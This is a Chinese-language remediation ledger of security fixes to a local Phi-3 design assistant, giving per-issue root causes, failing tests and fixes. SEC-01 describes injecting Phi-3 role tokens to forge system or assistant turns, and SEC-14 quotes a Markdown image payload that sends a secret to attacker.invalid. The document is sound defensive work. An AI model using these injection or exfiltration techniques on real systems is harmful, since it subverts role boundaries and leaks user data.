# 安全修复台账

本文件只记录修复执行状态；原始证据以 `docs/security-audit-issues.md` 为准。

| ID | 标题 | 风险 | 被破坏的不变量 | 状态 | 失败测试 | 修复文件 | Commit | Push | 剩余风险 |
|---|---|---|---|---|---|---|---|---|---|
| SEC-01 | Phi-3 保留 token 可突破用户角色边界 | P1 | 用户输入不能改变消息角色边界 | needs-real-runtime-validation | `tests/test_local_model_client.py` | `src/local_model_client.py`; `src/prompts.py` | `8df755621e83ada0ffa195123a921d3366e3ed97` | pushed | 普通自然语言注入的服从率需真实模型验证；协议边界已由代码拒绝 |
| SEC-02 | 矛盾审查仍被标记为通过 | P1 | 任何未解决 finding 都不能 approved | pushed | `tests/test_schemas.py` | `src/schemas.py`; `src/prompts.py` | `6cfc4845440a5742b62ac8704932490fa4917f53` | pushed | 确定性架构完整性检查分别由后续问题处理 |
| SEC-03 | JSON 扫描器接受非唯一、非完整顶层对象 | P1 | 歧义、截断和重复键输出不得静默接受 | pushed | `tests/test_output_parser.py`; `tests/test_local_model_client.py` | `src/output_parser.py`; `src/local_model_client.py` | `3fb200b7e48bdf9e8dc583afe448cae8bb75ba9d` | pushed | 未知 finish reason 的策略仍保守保留为 unknown |
| SEC-04 | 全局无界模型缓存导致 OOM 与并发访问 | P1 | 缓存有界且同一可变模型 context 不并发 | needs-real-runtime-validation | `tests/test_local_model_client.py` | `src/local_model_client.py`; `app.py` | `6e7c703b7e5006ce1be3718500d2dbe7809f092a` | pushed | 真实 GGUF 峰值内存和原生并发行为需本地运行验证 |
| SEC-05 | Schema 校验不严格且不验证依赖图 | P2 | 格式合法不等于架构正确 | pushed | `tests/test_schemas.py`; `tests/test_output_parser.py` | `src/schemas.py`; `src/output_parser.py`; `app.py` | `bb8b8d9fca786638b1fe3ebe4ccd0d02d3a2286a` | pushed | 修订身份和必改项迁移约束由 SEC-06 处理 |
| SEC-06 | 修订阶段没有强制状态迁移约束 | P2 | 修订不得静默改变资源身份或忽略必改项 | pushed | `tests/test_orchestrator_revision.py`; `scripts/orchestrator_smoke_test.py` | `src/orchestrator.py`; `src/schemas.py`; `src/prompts.py`; `src/ui.py` | `9236359c12bc6ad8d1936775ae0ba792f80295da` | pushed | 术语约束证明设计文本已包含要求，不证明真实 Azure 行为 |
| SEC-07 | 视觉空输入/控制字符通过校验且校验过晚 | P2 | 无效输入不得触发昂贵模型加载 | pushed | `tests/test_schemas.py`; `tests/test_input_validation.py` | `src/schemas.py`; `src/orchestrator.py`; `app.py` | `805d0957c080fe53b4810a964a585f1f0e67b830` | pushed | Unicode 控制字符策略保守拒绝 Cc/Cf/Cs（换行、回车、制表符除外） |
| SEC-08 | 模型路径校验不足 | P2 | 非 GGUF、相对路径、目录和 symlink 必须拒绝 | pushed | `tests/test_config.py` | `src/config.py`; `app.py`; `.env.example`; `README.md` | `84ada63414d903492e73004ebd016dbcc8be2f4c` | pushed | 文件通过边界检查不保证 llama.cpp 能解析全部 GGUF 元数据 |
| SEC-09 | 推理无超时、生成期取消和上下文预算预检 | P2 | 推理、等待与重试必须有界 | needs-real-runtime-validation | `tests/test_local_model_client.py`; `tests/test_input_validation.py`; `tests/test_config.py` | `src/local_model_client.py`; `src/orchestrator.py`; `src/config.py`; `.env.example`; `README.md` | `3145e9b799922195d2872ec2564c5f5c9bd2766b` | pushed | 真实 GGUF 的底层 abort callback 仍需验证 |
| SEC-10 | 新运行失败后仍展示旧成功结果 | P2 | 新任务失败不能展示旧任务结果 | pushed | `tests/test_ui_run_isolation.py` | `app.py`; `src/ui.py` | `5b6296fa35b21fa82aa11a92668f1c4e7a605041` | pushed | 不保留历史结果列表，避免默认混淆 |
| SEC-11 | trace 失败与 UI 完成终态矛盾 | P2 | 每个 run 只有一个明确终态 | pushed | `tests/test_trace_terminal_state.py` | `app.py` | `413c6ba7932d2cb793738cd3f7ea072193e42539` | pushed | trace 文件本身安全属性由 SEC-12 处理 |
| SEC-12 | trace 文件隐私、并发和链接安全问题 | P2 | trace 不泄露、不混写、不跟随链接且可恢复 | pushed | `tests/test_trace_writer.py`; `tests/test_trace_terminal_state.py` | `src/trace_writer.py`; `app.py`; `.gitignore`; `README.md`; `docs/architecture.md` | `2579ac203366d1826b2a83672645dac9b717403f` | pushed | UI 只使用默认脱敏模式 |
| SEC-13 | CPU 回退永久污染进程环境 | P2 | 后端配置不得跨运行或会话污染 | needs-real-runtime-validation | `tests/test_local_model_client.py` | `src/local_model_client.py` | `8218cdfd40a1c18d9e9e9f6c91a2a4593f86340f` | pushed | CPU/Metal 实际 offload 需真实 GGUF 验证 |
| SEC-14 | 模型文本经 Markdown 渲染可触发外部请求 | P2 | 模型输出不得触发外部请求 | pushed | `tests/test_ui_safe_rendering.py`; `tests/test_ui_run_isolation.py` | `src/ui.py`; `app.py` | `ab8857ce083c1fc1b181dbbe517ab597fd5bd23d` | pushed | 页面级 CSP 由部署边界负责 |
| SEC-15 | 依赖未完整锁定 | P3 | 干净环境安装必须可复现 | pushed | `tests/test_dependency_lock.py`; clean venv `pytest` | `requirements.txt`; `requirements.lock`; `README.md`; `tests/test_local_model_client.py` | `d8d8a7aae77600ded915448872f4dc254027d0c1` | pushed | Xcode SDK/编译器不属于 Python 锁 |
| SEC-16 | 朴素 ZIP 会包含 Git 忽略的敏感文件 | P3 | 敏感文件不得进入最终交付物 | confirmed | pending | pending | pending | pending | 待处理 |

## SEC-01 第一性原则记录

- **资产：** system/user/assistant 角色边界、系统提示完整性、审查结果可信度。
- **不可信入口：** 用户需求，以及被再次放入消息上下文的模型生成文本。
- **信任边界：** AutoGen `LLMMessage.content` 到 Phi-3 原生 instruct token 字符串。
- **被破坏的不变量：** 消息内容只能是数据，不能创建新的协议角色或结束当前角色。
- **最小失败路径：** 内容包含 `<|end|>` 后跟 `<|system|>` 或 `<|assistant|>`；渲染器原样拼接，形成新的协议段。
- **当前代码为何允许：** `_render_phi3_prompt` 只映射外层消息角色，不检查内层文本中的协议 token。
- **根本原因：** 控制结构和不可信数据共享同一种未经转义或拒绝的字符串表示。
- **修复前失败测试：** `.venv/bin/python -m unittest discover -s tests -p 'test_local_model_client.py' -v`；5 种 token 在用户输入和模型生成文本两条路径共 10 个子用例失败，正常对照通过。
- **最小根本修复：** 在唯一协议渲染边界拒绝任意 `<|…|>` 形式的 token；系统提示同时声明需求和 JSON 为不可信数据。
- **修复后证明：** 同一命令 3 个测试通过；覆盖已知角色/结束 token、通用 token 形态、两类不可信来源和正常渲染。
- **文档与代码差异：** 无；审计描述可在修复前代码稳定复现。
- **验证限制：** 未运行真实 GGUF；普通自然语言 prompt injection 的具体服从率仍需真实本地运行验证。`scripts/agent_smoke_test.py` 因环境未配置 `PHI3_MODEL_PATH` 在加载模型前失败。

## SEC-02 第一性原则记录

- **资产：** 审批终态、绿色成功 UI 和最终架构的可信度。
- **不可信入口：** 审查模型返回的 `decision`、`findings` 和 `required_changes`。
- **信任边界：** 模型 JSON 经 Pydantic Schema 进入 orchestrator 终态判断。
- **被破坏的不变量：** 任何未解决 finding 都不能得到 `approved`。
- **最小失败路径：** `decision="approved"`、一个 finding、`required_changes=[]`；Schema 接受后调度器直接返回 `completed/approved`。
- **当前代码为何允许：** validator 只关联 `decision` 与 `required_changes`，没有关联 `findings`。
- **根本原因：** 把模型声明的决策当作权威，而 Schema 没有表达批准所需的完整跨字段条件。
- **修复前失败测试：** `.venv/bin/python -m unittest discover -s tests -p 'test_schemas.py' -v`；critical、high、medium、low 四个子用例失败，空 findings 正向对照通过。
- **最小根本修复：** Schema 强制 `approved` 同时满足 `findings=[]` 与 `required_changes=[]`；提示契约同步明确该条件。
- **修复后证明：** Schema 回归测试覆盖全部 finding 严重度、无 finding 正常批准，以及既有调度器完整流程。
- **文档与代码差异：** 无；问题可稳定复现。
- **剩余风险：** 资源唯一性、依赖闭包和修订约束属于 SEC-05、SEC-06，尚未在本提交处理。

## SEC-03 第一性原则记录

- **资产：** 模型原始输出与实际解析决策的一致性，以及审批输入的完整性。
- **不可信入口：** 模型返回的任意文本、JSON 对象和原生 `finish_reason`。
- **信任边界：** llama.cpp 响应进入应用 Schema 与审批状态机。
- **被破坏的不变量：** 只接受唯一、完整、无重复键的顶层 JSON 对象；截断输出不得进入成功路径。
- **最小失败路径：** 在包装对象内部放置合法对象、在合法对象后追加损坏 JSON，或重复同名键；扫描器只选取一个 Schema-valid 候选并忽略其余原文。
- **当前代码为何允许：** 从每个 `{` 调用 `raw_decode`，未消费全文；标准 decoder 默认以最后一个重复键覆盖前值；`finish_reason=length` 仍返回 `CreateResult`。
- **根本原因：** 把结构化响应当成可搜索的候选集合，而不是一个必须原子验证的完整消息。
- **修复前失败测试：** `tests/test_output_parser.py` 中嵌套提升、数组提升、前后缀、截断尾部和重复键用例失败；`tests/test_local_model_client.py` 的 length 终止用例失败。
- **最小根本修复：** 去除可选完整外层代码围栏后只调用一次 `json.loads`；用 `object_pairs_hook` 在所有层拒绝重复键；length 终止直接抛出协议错误。
- **修复后证明：** 目标测试 9 项通过；正常完整对象和完整 JSON 代码围栏仍被接受，原始漏洞及相邻包装路径均被拒绝。
- **文档与代码差异：** 无；审计列出的三类解析绕过和 length 路径均可复现。
- **剩余风险：** Schema 的严格类型与依赖图语义属于 SEC-05；本项不通过默认值或纠错掩盖模型输出。

## SEC-04 第一性原则记录

- **资产：** 本机内存、llama.cpp 可变 context、跨会话输出隔离和 usage 计数。
- **不可信入口/故障：** 用户切换模型路径、上下文、CPU/Metal 或生成参数，以及多个会话同时推理。
- **信任边界：** Streamlit 全局资源生命周期与每个会话/运行的生成调用之间。
- **被破坏的不变量：** 进程最多保留一个模型 runtime；同一可变 context 最大并发必须为 1；被替换资源必须显式关闭。
- **最小失败路径：** 两个线程同时调用共享客户端；修复前假模型记录到 `max_active=2`。改变 `max_tokens` 等缓存键还会创建新的全局模型对象。
- **当前代码为何允许：** 无界 `st.cache_resource` 同时缓存权重和生成配置；共享 `_model` 的 reset、生成、分词与 usage 更新没有共同互斥锁或生命周期所有者。
- **根本原因：** 把有状态、昂贵且需显式释放的原生 context 当作普通纯函数缓存值。
- **修复前失败测试：** `SharedModelConcurrencyTests.test_serializes_calls_to_one_mutable_model_context` 稳定失败，观测值为 2、期望为 1。
- **最小根本修复：** 用进程级单槽注册表拥有 runtime；缓存身份只含规范化路径、`n_ctx`、GPU 层数和 seed；生成参数留在每次运行的轻量客户端；runtime 锁覆盖 reset/生成/分词/close；替换前和进程退出时显式 close。
- **修复后证明：** 双线程最大并发为 1 且 usage 完整；生成参数变化复用同一 runtime；身份变化按 close-old→load-new 顺序执行；close 幂等且关闭后调用安全失败。
- **文档与代码差异：** 无；无锁并发和生成参数参与缓存键均可复现。
- **验证限制：** 未加载真实 GGUF，尚未测量 3–5 个历史键的实际峰值内存，也未验证 llama.cpp 原生崩溃形态；代码级单槽和串行不变量已离线证明。

## SEC-05 第一性原则记录

- **资产：** 架构计划字段的原始语义、资源依赖完整性以及审批输入可信度。
- **不可信入口：** 模型 JSON 中的类型、缺失字段、资源名称和依赖边。
- **信任边界：** 严格 JSON 解析结果进入 Pydantic 数据契约和调度器。
- **被破坏的不变量：** 格式可解析不等于架构有效；模型输出不得被类型转换、默认值或推断逻辑静默修复。
- **最小失败路径：** `revision` 使用字符串/浮点/布尔，省略关键字段，或提交重名、悬空、自依赖/循环资源图；旧 Schema 全部接受。
- **当前代码为何允许：** `StrictModel` 未启用 strict；模型字段带默认值；before-validator 会包装标量并从 recommendation 推断缺失字段；计划没有图校验器。
- **根本原因：** 数据契约承担了容错修复职责，并只验证局部字段形状，没有表达跨资源语义。
- **修复前失败测试：** `ArchitecturePlanStrictnessTests` 共 16 个子用例失败；审查字段默认/派生共 4 个子用例失败。
- **最小根本修复：** 全局 StrictModel 开启严格模式；所有模型输出字段改为显式必填；删除标量包装和字段推断；计划 after-validator 强制名称唯一、依赖无重复、引用闭包、无自依赖且无环。
- **修复后证明：** 严格 Schema 和解析器 13 项测试通过；完整正常计划、无 finding 审批及脚本化 plan→review→revision→approval 流程通过。
- **文档与代码差异：** 无；审计列出的类型转换、默认值和依赖图问题均可复现。
- **剩余风险：** 修订阶段保持资源身份并落实 required_changes 的状态迁移约束属于 SEC-06。

## SEC-06 第一性原则记录

- **资产：** 计划资源身份、依赖语义、审查必改项以及状态机从 revision_required 到 approved 的可信度。
- **不可信入口：** planner 生成的修订计划，以及 reviewer 生成的 required_changes。
- **信任边界：** 已验证的当前计划/审查进入下一版计划，再进入后续审批。
- **被破坏的不变量：** 修订必须保持资源身份与依赖关系、产生实质变化，并落实每个机器可验证的必改项。
- **最小失败路径：** 只增加 revision 数字，或改名、增删资源、改变依赖，或仅在无关字段复述要求；旧调度器只检查 revision 数字，下一轮可直接 approved。
- **当前代码为何允许：** “保持名称和数量”只存在于提示词；required_changes 是不可验证的自由文本；解析成功后没有前后状态比较。
- **根本原因：** 状态迁移契约没有代码表示，控制流把两份各自合法的快照误当作合法迁移。
- **修复前失败测试：** 完整假模型调度器中未修改、改名、新增、删除、依赖变化和错误目标字段 6 个子用例全部得到 `completed/approved`，期望 failed。
- **最小根本修复：** required_changes 改为受限目标字段、资源名和必含术语；修订解析边界比较名称集合、类型、依赖边和除 revision 外的内容，并逐项验证目标字段。
- **修复后证明：** 6 个非法迁移均失败；正确 API high_availability 目标含 `two instances` 的脚本化全流程通过；UI 仍显示人类可读 description。
- **文档与代码差异：** 无；审计列出的改名、增删和忽略修改均可复现。
- **剩余风险：** 本工具只输出设计文本；字段术语约束证明输出落实了审查要求，不等同于真实 Azure 部署或运行验证。

## SEC-07 第一性原则记录

- **资产：** 本机模型内存/算力、run 终态一致性和用户可理解的输入错误。
- **不可信入口：** 空串、空白、换行、零宽格式字符、NUL 和其他控制字符。
- **信任边界：** Streamlit 文本输入进入模型加载与 orchestrator 状态机。
- **被破坏的不变量：** 无意义或非法输入不得加载模型、不得进入 running，并必须产生明确失败终态。
- **最小失败路径：** 10 个零宽字符或 NUL 满足长度限制并进入模型；普通空白虽最终校验失败，但 UI 已先调用模型加载，orchestrator 又在 try 外抛出。
- **当前代码为何允许：** 只依赖 strip/长度；没有 Unicode 类别策略；UI 和状态机的验证顺序晚于昂贵资源与异常边界。
- **根本原因：** 输入有效性被当作字段长度问题，而不是资源准入与状态机前置条件。
- **修复前失败测试：** 零宽/NUL/控制字符 3 个 Schema 子用例失败；调度器空白输入抛出非结构化异常，零宽/NUL 各调用模型 1 次；UI mock 证明先调用 load_local_model。
- **最小根本修复：** NFKC 规范化；拒绝 Cc/Cf/Cs（仅允许换行、回车、制表符）和无可见字符；UI 在模型加载前构造 ArchitectureRequest；orchestrator 在 try 内验证并生成 request=None 的脱敏 failed 结果。
- **修复后证明：** 空串、空格、换行、零宽、NUL 和混合控制字符均拒绝；模型/加载调用为 0；只产生一个 error 事件；可见多行输入正常通过；completed 结果禁止 request=None。
- **文档与代码差异：** 无；问题和验证顺序均可复现。
- **剩余风险：** 保守策略会拒绝含零宽连接符或双向格式控制的文本；用户可移除这些不可见字符后重试。

## SEC-08 第一性原则记录

- **资产：** 本机文件系统机密、模型内存预算、runtime 缓存身份和 llama.cpp 稳定性。
- **不可信入口：** UI/环境传入的路径、扩展名、symlink、文件内容与大小。
- **信任边界：** 字符串路径进入文件系统解析、原生 GGUF 加载和进程级 runtime 注册表。
- **被破坏的不变量：** 只允许受信根目录内、绝对、非 symlink、常规且具备合理大小和 GGUF magic 的文件。
- **最小失败路径：** 指向任意可读文本的相对路径、`.txt`、`.gguf` symlink、错误 magic 或 4 字节伪文件；旧代码只调用 is_file。
- **当前代码为何允许：** 未规范化身份、未限制根目录、未验证后缀/类型/header/大小，也未用 no-follow 打开。
- **根本原因：** 把“文件存在”误当作“允许且可安全交给原生解析器的模型”。
- **修复前失败测试：** 相对、非 GGUF、symlink、错误 magic 与 tiny 共 5 类失败；目录和缺失路径为既有正向控制。
- **最小根本修复：** 以 `PHI3_MODEL_ROOT` 作为操作员信任边界；strict resolve 与根目录 containment；拒绝最终 symlink；`O_NOFOLLOW` 打开并用 fstat 验证 regular file、1 MiB–64 GiB 和 `GGUF` magic；错误不回显路径。
- **修复后证明：** 7 项测试覆盖所有拒绝路径、根外有效文件、路径脱敏与根内有效临时 GGUF；runtime 仍以 resolved 路径作为唯一身份。
- **文档与代码差异：** 无；审计描述可稳定复现。
- **剩余风险：** 4 字节 magic 和大小边界不能证明完整 GGUF 元数据正确；最终解析仍由本地 llama.cpp 完成并可安全报错。

## SEC-09 第一性原则记录

- **资产：** 本机 CPU/GPU、共享 llama.cpp context、公平排队能力和每次架构运行的确定终态。
- **不可信入口/故障：** 超长需求、过大的 completion 预算、迟滞/故障模型、页面刷新与调用方取消。
- **信任边界：** async AutoGen 调用进入同步 llama.cpp 推理线程，以及多步智能体循环共享同一总运行预算。
- **被破坏的不变量：** prompt 与 completion 必须装入 context；单次推理和完整运行必须有墙钟上限；取消必须传播到正在执行的原生生成。
- **最小失败路径：** 100-token prompt 配 32-token completion 进入 128-token context；协作式慢模型无视超时；生成开始后取消仍运行到自然结束。
- **当前代码为何允许：** 只在 `_model(...)` 前检查一次取消；同步生成直接阻塞事件循环；`remaining_tokens()` 没有成为准入条件；调度器没有共享 deadline。
- **根本原因：** async 接口只改变了函数签名，没有为同步原生工作建立工作线程、协作中断信号和分层时间预算。
- **修复前失败测试：** `InferenceBoundTests` 的 context budget、生成期取消、推理超时三个用例全部失败；分别观察到生成被调用、无 `CancelledError`、无 `TimeoutError`。
- **最小根本修复：** 生成前在线程中分词并拒绝超预算；同步推理移入工作线程；同一 abort predicate 连接 CancellationToken、墙钟 deadline、llama stopping criteria 与底层 abort callback；调度器用共享 deadline 和 `asyncio.wait_for` 限制所有重试与轮次。
- **修复后证明：** 三条原始回归通过；并发串行与截断拒绝相邻回归通过；新增完整 run 20ms deadline 用例在 500ms 内返回 failed；配置拒绝非正数和超过 600 秒的推理期限。
- **文档与代码差异：** 无；修复前同步阻塞、仅前置取消和未使用 token 预算均稳定复现。
- **验证限制：** 离线假模型证明 Python 层停止条件与终态映射；未加载真实 GGUF，需验证 llama.cpp 0.3.34 在 Metal/CPU 长生成中的 callback 延迟和原生资源回收。

## SEC-10 第一性原则记录

- **资产：** 当前请求与展示结果的身份绑定、用户对成功/失败终态的正确理解。
- **不可信入口/故障：** 新需求、模型路径错误、配置异常、模型加载或推理异常。
- **信任边界：** Streamlit 按钮触发的新尝试进入 session state，再由持久化 state 驱动结果页渲染。
- **被破坏的不变量：** 新尝试开始后，上一 run 的成功结果不得继续作为当前请求的结果展示。
- **最小失败路径：** session 已有旧成功结果；点击生成新需求；`run_architecture` 抛出 ConfigurationError；异常分支只显示错误而不覆盖旧 state；底部仍渲染旧绿色结果。
- **当前代码为何允许：** `architecture_result` 只在成功返回时覆盖，开始与异常状态都没有使旧结果失效。
- **根本原因：** session state 只建模“最近一次成功产物”，没有把点击生成视作会立即改变当前结果归属的状态转换。
- **修复前失败测试：** `test_failed_new_attempt_does_not_render_previous_success` 观察到新运行失败后 state 仍为 `old-success`，且旧结果继续进入渲染路径。
- **最小根本修复：** 处理 generate 事件时、进入任何可能失败的设置或推理前，原子清空当前展示结果；成功后只保存本 run 的完整结果。
- **修复后证明：** 同一故障注入后 state 为 None 且 `render_result` 未调用；正常结果页额外显示不可混淆的 run ID，并以代码块展示结果对象内的原始需求。
- **文档与代码差异：** 无；审计描述的异常分支可稳定复现。
- **剩余风险：** 当前实现不保留历史结果列表；这是刻意的安全默认值，需历史功能时应使用与当前结果分离且显式标注的视图。

## SEC-11 第一性原则记录

- **资产：** 已生成方案、Session State 可用结果，以及 UI 单一且有序的终态。
- **故障入口：** 磁盘满、权限错误、目录不可用、序列化或 fsync 失败。
- **信任边界：** orchestrator 的计算成功结果进入可选本地 trace 副作用，再进入页面持久状态。
- **被破坏的不变量：** 可选审计记录失败不得把有效计算结果变成失败；完成终态只能在所有影响终态展示的后处理完成后发出。
- **最小失败路径：** orchestrator 先发 COMPLETED，status 变绿；`append_trace` 随后抛 OSError；`run_architecture` 不返回结果，main 只显示失败且无法写入 Session State。
- **当前代码为何允许：** UI 直接把 orchestrator 的内部完成事件当作页面最终提交，同时 trace 异常与核心计算异常共用外层失败路径。
- **根本原因：** 计算完成、可选持久化和页面状态提交没有明确的提交顺序与故障隔离边界。
- **修复前失败测试：** 注入 `append_trace` 磁盘满错误后，timeline 为 complete→trace，随后 OSError 逃逸，期望的有效结果无法返回。
- **最小根本修复：** COMPLETED 事件只把 UI 置于“正在确认记录”的 running 状态；trace 独立 try/except；无论 trace 成败都返回有效结果；最后才把已完成 run 提交为绿色终态。
- **修复后证明：** 同一故障注入得到 running→trace→warning→complete；返回对象与计算结果相同，warning 明确说明只有记录失败，Session State 上层可继续保存结果。
- **文档与代码差异：** 无；原先完成事件、trace 和 state 保存的顺序与审计一致。
- **剩余风险：** 本项只修复终态排序与故障隔离；trace 文件权限、链接、并发和隐私属于 SEC-12。

## SEC-12 第一性原则记录

- **资产：** 用户需求与模型文本的机密性、run 归属、trace 完整性及本机非目标文件。
- **不可信入口/故障：** 模型与用户敏感文本、输出路径中的 symlink、宽松 umask、并发会话、进程或磁盘中途失败。
- **信任边界：** 已验证运行结果进入本机文件系统命名空间，之后可能被同机用户、其他会话或故障恢复流程读取。
- **被破坏的不变量：** 默认记录不得包含敏感正文；目录/文件必须仅属当前用户；不得跟随链接或覆盖既有 run；可见文件必须是完整 JSON。
- **最小失败路径：** umask=000 时旧目录/文件成为 0777/0666；输出文件为 symlink 时追加内容进入攻击者指定目标；所有会话共享一个可产生半行的 JSONL。
- **当前代码为何允许：** `Path.mkdir` 与文本追加完全继承 umask、默认跟随链接、没有锁/事务边界，并序列化完整 result。
- **根本原因：** 把敏感审计记录当作普通日志追加，没有定义私有存储、命名、最小披露和原子发布协议。
- **修复前失败测试：** 宽松 umask 下权限断言观测 0777 而非 0700，trace 含两类 secret；symlink 用例未抛异常并修改目标文件。
- **最小根本修复：** 逐目录用 dir-fd、`O_DIRECTORY|O_NOFOLLOW` 安全打开并固定最终目录 0700；每个 run 独立 JSON；临时文件 0600 完整写入并 fsync 后用排他 hard-link 原子发布；默认只保留脱敏运行元数据。
- **修复后证明：** 权限、默认脱敏、目录 symlink 拒绝、12 个并发 run 独立完整 JSON、部分写故障不发布 final 且清理 temp 五条回归全部通过。
- **文档与代码差异：** 审计称默认 0644；在受控 umask=000 下风险更严重为 0666，说明问题成立且影响上界更高。
- **剩余风险：** `include_sensitive_content=True` 是仅供显式调用的高风险选项；UI 不启用它。安全目录遍历要求路径各组件不是 symlink，非 POSIX/缺少 `O_NOFOLLOW` 的平台会安全拒绝。

## SEC-13 第一性原则记录

- **资产：** 推理后端选择的确定性、不同 Streamlit 会话的配置隔离和操作员预设环境。
- **不可信入口/状态：** 用户在 CPU 与 Apple Metal 间切换，以及同一进程中不同会话的构造顺序。
- **信任边界：** 每次运行的 `AppConfig.n_gpu_layers` 进入进程级环境和 llama.cpp runtime 初始化。
- **被破坏的不变量：** 构造轻量客户端不得改变进程环境；一个会话的 CPU 选择不能影响之后或并发的 Metal 运行。
- **最小失败路径：** 操作员设置 `GGML_METAL_DEVICES=operator-selected-device`；先构造 CPU client，再构造 Metal client；环境永久变为 `none`。
- **当前代码为何允许：** CPU 分支在客户端构造函数中直接赋值 `os.environ`，Metal 分支没有恢复，且没有生命周期或互斥边界。
- **根本原因：** 已由 llama.cpp 参数表达的每-runtime 后端选择，被重复实现成不可逆的进程全局副作用。
- **修复前失败测试：** CPU→Metal 顺序测试观测环境值 `none`，期望保留 `operator-selected-device`。
- **最小根本修复：** 删除运行时环境写入；继续把 `n_gpu_layers=0` 直接传给 `Llama` 选择 CPU，Metal 使用配置值 `-1`。
- **修复后证明：** 同一 CPU→Metal 构造序列保持操作员环境不变；完整本地客户端协议、并发和 runtime 生命周期测试共 12 项通过。
- **文档与代码差异：** 无；审计描述的顺序依赖可稳定复现。
- **验证限制：** 未加载真实 GGUF；参数传递路径离线可见，但 CPU/Metal 实际 layer offload 与性能仍需本机运行验证。

## SEC-14 第一性原则记录

- **资产：** 完全本地的数据闭环、用户 IP/时间/URL 参数及模型可能复述的敏感内容。
- **不可信入口：** 计划 title/summary/策略、审查 summary/finding/recommendation/required change，以及可能包含模型文本的错误。
- **信任边界：** 通过 Schema 的字符串进入 Streamlit Markdown、状态容器、标题、expander 标签和浏览器 DOM。
- **被破坏的不变量：** 模型控制的字符串只能作为惰性纯文本显示，不能创建图片、链接、HTML 或其他主动浏览器资源。
- **最小失败路径：** 模型字段为 `![exfil](https://attacker.invalid/collect?secret=abc)`；bullet、plan summary 和 review summary 分别进入 `st.markdown`、`st.write`、`st.success`。
- **当前代码为何允许：** Schema 只验证长度与结构；UI 把“已验证字符串”误当作“可安全解释的 Markdown”。
- **根本原因：** 数据验证边界与输出编码边界混为一谈，没有依据渲染上下文选择纯文本 sink。
- **修复前失败测试：** 三条恶意 Markdown 回归均失败，mock 分别捕获到动态 payload 进入 markdown/write/success。
- **最小根本修复：** 所有模型正文改用 `st.text`/`st.code`/`st.json`；状态组件只接收静态文案；finding expander 标签只含序号与受限严重度，类别、问题和建议在内部按纯文本显示；动态错误正文移入代码块。
- **修复后证明：** bullet、标题、摘要、finding 三类路径均只把恶意 payload 传入纯文本 sink；异常 UI 也只在静态错误框外用 code 显示详情；相邻 run 身份和 trace 终态测试通过。
- **文档与代码差异：** 无；审计点名的三个 sink 均可稳定复现。
- **剩余风险：** `st.dataframe` 展示结构化资源字符串但不解释 Markdown；用户主动复制或访问文本中的 URL 不属于自动外部请求。Streamlit 页面级 CSP 仍由部署反向代理负责。

## SEC-15 第一性原则记录

- **资产：** 构建可重复性、测试可执行性、依赖供应链完整性和 llama.cpp Metal 后端一致性。
- **不可信入口/变化：** 包索引随时间新增发行版、传递依赖解析、平台 wheel 选择、源码构建后端及 pip 版本变化。
- **信任边界：** 五个直接依赖版本进入 pip resolver，随后下载并执行数十个第三方发行物及 llama.cpp 原生构建。
- **被破坏的不变量：** 同一 Python/平台安装必须解析到相同版本且校验内容哈希；验收命令所需 pytest 必须由仓库声明。
- **最小失败路径：** 在不同日期执行 `pip install -r requirements.txt`，numpy/protobuf/requests/tornado/pyarrow 等重新解析；当前 venv 执行 `python -m pytest` 直接报模块缺失。
- **当前代码为何允许：** 直接依赖的 `==` 被误认为完整锁定，没有传递依赖、发行物哈希、解析工具版本或测试依赖。
- **根本原因：** 人工依赖意图文件同时承担了不可变安装清单职责，但两者需要不同更新和审计流程。
- **修复前失败测试：** `DependencyLockTests` 因 `requirements.lock` 不存在失败；既有全量检查中 pytest 持续以 `No module named pytest` 失败。
- **最小根本修复：** 保留 `requirements.txt` 作为直接依赖输入并显式加入 pytest；用 CPython 3.11.15、pip 25.3、pip-tools 7.5.2 生成全传递依赖 `requirements.lock`，每项精确版本且附 PyPI SHA-256；README 固定 Metal CMake 参数与 `--require-hashes` 安装命令。
- **修复后证明：** 锁结构测试验证 20+ 包全部 `==` 且带 SHA-256，并点名关键传递依赖；全新 macOS arm64 venv 从锁完成 Metal 源码构建、52 项 pytest 和 `pip check`；当前环境同样 52 项通过。
- **文档与代码差异：** 审计点名的传递依赖全部出现在锁中；此外补齐 pytest、iniconfig、pluggy、pygments 等测试链。
- **剩余风险：** PyPI sdist 的隔离构建依赖由 PEP 517 引导安装，源码本身受锁内 hash 保护但编译器/Xcode SDK 不在 Python 锁内；README 固定已验证的 macOS/CPython 与 CMake 参数，跨 OS 需另建平台锁并验证。
